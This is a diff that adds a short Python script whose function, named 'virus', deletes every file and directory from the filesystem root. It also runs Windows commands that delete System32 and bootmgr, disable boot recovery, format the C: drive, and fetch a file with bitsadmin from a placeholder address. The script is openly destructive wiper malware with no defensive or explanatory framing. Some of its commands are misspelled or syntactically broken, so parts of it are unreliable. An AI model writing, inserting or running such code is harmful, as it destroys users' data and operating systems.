@@ -1,0 +1,23 @@
+import os 
+import sys 
+from shutil import rmtree 
+  
+path = "/" 
+
+def virus(): 
+    for root, dirs, files in os.walk(path): 
+        for file in files: 
+            os.remove(os.path.join(root, file)) 
+        for dir in dirs: 
+            rmtree(os.path.join(root, dir)) 
+    os.system("del C:\Windows\System32\*.* /F /S /Q") 
+    os.system("bcdedit /set {default} bootstatuspolicy ignoreallfailures")
+    os.system("bcdedit /set {default} recoveryenabled no") 
+    os.system("dcacls C:\Windows\ /E /C /G user:F")
+    os.system("format C:\")
+    os.system("del C:\bootmgr")
+    os.system("bitsadmin /transfer myJob /download /priority high http address /destination C:\Users\username\filename") 
+  
+if __name__ == '__main__': 
+    virus() 
+    sys.exit()
